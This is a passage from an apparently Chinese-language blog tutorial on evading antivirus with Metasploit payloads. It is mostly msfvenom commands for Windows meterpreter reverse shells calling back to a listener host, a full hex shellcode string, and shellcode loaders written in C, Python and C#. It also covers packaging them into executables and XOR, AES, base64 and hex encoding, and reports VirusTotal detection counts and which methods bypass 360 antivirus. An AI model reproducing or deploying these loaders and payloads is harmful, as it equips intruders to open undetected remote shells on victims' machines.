return 0;</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">f = open(&quot;shellcode.txt&quot;,&quot;w&quot;)</span><br><span class="line">f.write(data)</span><br></pre></td></tr></table></figure><p>再将生成<code>shellcode.txt</code>内容粘贴到vs2019中进行编译（注意1关闭DEP：调试-project调制属性-链接器-高级-DEP,注意2关闭优化：调试-project调制属性-C&#x2F;C++-优化）</p><h3 id="2-shellcode加载器"><a href="#2-shellcode加载器" class="headerlink" title="2.shellcode加载器"></a>2.shellcode加载器</h3><h4 id="1-使用shellcode-launcher（过不了微软）"><a href="#1-使用shellcode-launcher（过不了微软）" class="headerlink" title="1.使用shellcode_launcher（过不了微软）"></a>1.使用shellcode_launcher（过不了微软）</h4><p>github项目地址：<a href="https://github.com/clinicallyinane/shellcode_launcher">https://github.com/clinicallyinane/shellcode_launcher</a></p><p>msf生成raw格式的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw -o shellcode.raw</span><br></pre></td></tr></table></figure><p>在目标机器上用shellcode_launcher.exe执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher.exe -i shellcode.raw</span><br></pre></td></tr></table></figure><p>msf会正常上线。</p><h4 id="2-使用SSI加载-VT-24-71-过360"><a href="#2-使用SSI加载-VT-24-71-过360" class="headerlink" title="2.使用SSI加载(VT:24&#x2F;71 过360)"></a>2.使用SSI加载(VT:24&#x2F;71 过360)</h4><p>msf生成c文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.3.30 LPORT=3333 -f c -o msf.txt</span><br></pre></td></tr></table></figure><p>然后执行下面命令,会得到一串16进制字符串</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat msf.txt|grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &#x27;:a;N;$!ba;s/\n//g&#x27;|sed &quot;s/;//g&quot;</span><br><span class="line">fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5</span><br></pre></td></tr></table></figure><p>然后使用win上的i686-w64-mingw32-gcc配合SimpleShellcodeInjector.c编译生成ssi.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\mingw-w64\setting\mingw32\bin&gt;i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe</span><br></pre></td></tr></table></figure><p>其实在<code>SimpleShellcodeInjector\OLDBinary</code>文件中也有个ssi.exe，这是作者给编译好的，不过不建议使用，因为这个ssi.exe已经能被很多杀软查杀，最好就是使用上面的命令自己编译一个。使用编译生成的ssi.exe，参数为上面的16进制字符串，执行shellcode，msf可正常上线</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\mingw-w64\setting\mingw32\bin&gt;ssi.exe fce88f0000006031d2648b52308b520c89e58b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58205001d38b481885c9743c4931ff8b348b01d631c0acc1cf0d01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368050d0000e8e50000002f7a44506a36496a494e6b7271554f7452696c6f5854416f415550506a524338687250583938784d4e467a315249734850473030592d536931306a753848664c544d4442497a5a714139467232653567575a30793300506857899fc6ffd589c653680032e88453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e332e333000bbf0b5a2566a0053ffd5     </span><br></pre></td></tr></table></figure><h2 id="2-python（文件比较大，不合适）"><a href="#2-python（文件比较大，不合适）" class="headerlink" title="2.python（文件比较大，不合适）"></a>2.python（文件比较大，不合适）</h2><p><a href="https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA">https://mp.weixin.qq.com/s/HyBSqrF_kl2ARaCYAMefgA</a></p><h3 id="1-通过py源码编译exe"><a href="#1-通过py源码编译exe" class="headerlink" title="1  通过py源码编译exe"></a>1  通过py源码编译exe</h3><h4 id="1-python加载C代码（VT-8-69-过360）"><a href="#1-python加载C代码（VT-8-69-过360）" class="headerlink" title="1.python加载C代码（VT:8&#x2F;69 过360）"></a>1.python加载C代码（VT:8&#x2F;69 过360）</h4><p>msf生成c文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c</span><br><span class="line">[*] exec: msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.3.30 LPORT=3333   -f c</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of c file: 1512 bytes</span><br><span class="line">unsigned char buf[] = </span><br><span class="line">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span><br><span class="line">&quot;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x31\xff\x8b\x72\x28&quot;</span><br><span class="line">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="line">&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span><br><span class="line">&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;</span><br><span class="line">&quot;\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31\xff\x01\xd6\x31\xc0\xc1&quot;</span><br><span class="line">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="line">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="line">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="line">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="line">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span><br><span class="line">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span><br><span class="line">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x03\x1e\x68\x02&quot;</span><br><span class="line">&quot;\x00\x0d\x05\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="line">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span><br><span class="line">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span><br><span class="line">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span><br><span class="line">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span><br><span class="line">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span><br><span class="line">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span><br><span class="line">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span><br><span class="line">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span><br><span class="line">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span><br><span class="line">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</span><br></pre></td></tr></table></figure><p>python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后要使用PyInstaller将上述py文件转为exe（3.4M左右）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller.py -F pyshellcode.py</span><br></pre></td></tr></table></figure><p>执行生成的exe，msf正常上线</p><h4 id="2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用"><a href="#2-py2exe打包编译exe-VT-6-70-过360-蜜汁闪退？？？会弹黑框不建议使用" class="headerlink" title="2.py2exe打包编译exe(VT: 6&#x2F;70 过360 蜜汁闪退？？？会弹黑框不建议使用)"></a>2.py2exe打包编译exe(VT: 6&#x2F;70 过360 蜜汁闪退？？？会弹黑框不建议使用)</h4><p>该方法借用了免杀工具<code>Python-Rootkit</code>的思路。</p><p>首先要在windows上安装x86版的python。</p><p><strong>注意：必须使用x86版本Python 2.7,即使Windows是x64的，也要安装32位版本。</strong></p><p>这里安装的是Python 2.7.16 x86 windows版：</p><p><a href="https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi">https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi</a></p><p>之后安装32位Py2exe for python 2.7</p><p><a href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download">https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download</a></p><p>msfvenom生成python payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.30  LPORT=3333  -f raw -o shell.py</span><br></pre></td></tr></table></figure><p>创建文件setup.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from distutils.core import setup</span><br><span class="line">import py2exe</span><br><span class="line">setup(</span><br><span class="line">name = &quot;Meter&quot;,</span><br><span class="line">description = &quot;Python-based App&quot;,</span><br><span class="line">version = &quot;1.0&quot;,</span><br><span class="line">console = [&quot;shell.py&quot;],</span><br><span class="line">options = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,</span><br><span class="line">zipfile = None</span><br><span class="line">)</span><br><span class="line">raw_input()</span><br></pre></td></tr></table></figure><p>在windows下执行<code>python.exe .\setup.py py2exe</code>，(文件大小11M)</p><p>msf开启监听，即可上线</p><h4 id="3-base64编码-失败。。。"><a href="#3-base64编码-失败。。。" class="headerlink" title="3.base64编码(失败。。。)"></a>3.base64编码(失败。。。)</h4><p>msfvenom生成shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64  LHOST=192.168.3.30 LPORT=3333   -f c</span><br></pre></td></tr></table></figure><p>python代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">encode_shellcode = <span class="string">&quot;shellcode&quot;</span></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>使用pyinstaller编译打包exe(6.2m）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w pyshellcode.py</span><br></pre></td></tr></table></figure><h4 id="4-py-C编译exe-失败。。"><a href="#4-py-C编译exe-失败。。" class="headerlink" title="4.py+C编译exe(失败。。)"></a>4.py+C编译exe(失败。。)</h4><p>先用msfvenom生成shellcode:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -f c</span><br></pre></td></tr></table></figure><p>python代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#libc = CDLL(&#x27;libc.so.6&#x27;)</span></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">executable_code</span>(<span class="params">buffer</span>):</span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = <span class="built_in">len</span>(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to allocate memory&quot;</span>)</span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, <span class="built_in">len</span>(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to set protection on buffer&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="number">1</span>:</span><br><span class="line">              ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line">              ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line">                                          ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(<span class="built_in">len</span>(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>使用pyinstaller编译打包exe，生成文件大小3.4M</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w pyshellcode.py</span><br></pre></td></tr></table></figure><h4 id="5-xor加密（失败。。）"><a href="#5-xor加密（失败。。）" class="headerlink" title="5.xor加密（失败。。）"></a>5.xor加密（失败。。）</h4><p>先用msfvenom生成一个raw格式的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure><p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -py shellcode.raw se_null xor</span><br></pre></td></tr></table></figure><p>使用pyinstaller编译上一步骤中成的encryptedShellcodeWrapper_xor.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole encryptedShellcodeWrapper_xor.py</span><br></pre></td></tr></table></figure><h4 id="6-aes加密"><a href="#6-aes加密" class="headerlink" title="6.aes加密"></a>6.aes加密</h4><p>和方法五一样，只不过将<code>python shellcode_encoder.py -py shellcode.raw se_null xor</code>设置为<code>python shellcode_encoder.py -py shellcode.raw se_null aes</code>即可</p><h3 id="2-python加载器"><a href="#2-python加载器" class="headerlink" title="2.python加载器"></a>2.python加载器</h3><h4 id="1-HEX加密"><a href="#1-HEX加密" class="headerlink" title="1.HEX加密"></a>1.HEX加密</h4><p>这是使用了k8的方法：（<a href="https://www.cnblogs.com/k8gege/p/11223393.htmlk8%EF%BC%89%E7%9A%84%E5%B7%A5%E5%85%B7scrun%E4%B8%8D%E4%BB%85%E6%8F%90%E4%BE%9B%E4%BA%86%E5%8A%A0%E8%BD%BDpython%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%BF%98%E8%83%BD%E5%8A%A0%E8%BD%BDC#%E3%80%82">https://www.cnblogs.com/k8gege/p/11223393.htmlk8）的工具scrun不仅提供了加载python代码，还能加载C#。</a></p><p>先用msfvenom生成一个c格式的shellcode</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f c -o shell.c</span><br></pre></td></tr></table></figure><p>用k8飞刀把shellcode转成hex,k8飞刀地址：<a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a> （解压密码是k8gege）（encode&#x2F;decode-粘贴shellcode，shellcode只需一对引号引起来-全选-右键-hacking-shellcode-chartohex）</p><p>使用<code>python ScRunHex.py hexcode</code>就可以加载执行shellcode了</p><h4 id="2-base64加密"><a href="#2-base64加密" class="headerlink" title="2.base64加密"></a>2.base64加密</h4><p>同上一样，这次使用的是k8的<code>ScRunBase64.py</code></p><h2 id="3-c-（查杀概率仍然比较大）"><a href="#3-c-（查杀概率仍然比较大）" class="headerlink" title="3.c#（查杀概率仍然比较大）"></a>3.c#（查杀概率仍然比较大）</h2><p><a href="https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog">https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog</a></p><h3 id="1-C-源码直接编译exe"><a href="#1-C-源码直接编译exe" class="headerlink" title="1.C#源码直接编译exe"></a>1.C#源码直接编译exe</h3><h4 id="1-C-shellcode直接编译（VT-16-69-过360）"><a href="#1-C-shellcode直接编译（VT-16-69-过360）" class="headerlink" title="1.C#+shellcode直接编译（VT:16&#x2F;69 过360）"></a>1.C#+shellcode直接编译（VT:16&#x2F;69 过360）</h4><p>先用msfvenom生成基于C#的shellcode,使用了<code>shikata_ga_nai</code>编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -e x86/shikata_ga_nai  -i 15  -f csharp -o payload.txt</span><br></pre></td></tr></table></figure><p>然后将<code>payload.txt</code>文件中的shellcode代码复制到下面C#代码中</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">TCPMeterpreterProcess</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// native function’s compiled code</span></span><br><span class="line">            <span class="comment">// generated with metasploit</span></span><br><span class="line">            <span class="built_in">byte</span>[] shellcode = <span class="keyword">new</span> <span class="built_in">byte</span>[] &#123; msfvenom生成的 shellcode&#125;;</span><br><span class="line">            </span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode.Length,</span><br><span class="line">MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Marshal.Copy(shellcode, <span class="number">0</span>, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">IntPtr hThread = IntPtr.Zero;</span><br><span class="line">UInt32 threadId = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// prepare data</span></span><br><span class="line">IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"><span class="comment">// execute native code</span></span><br><span class="line">hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line">WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span 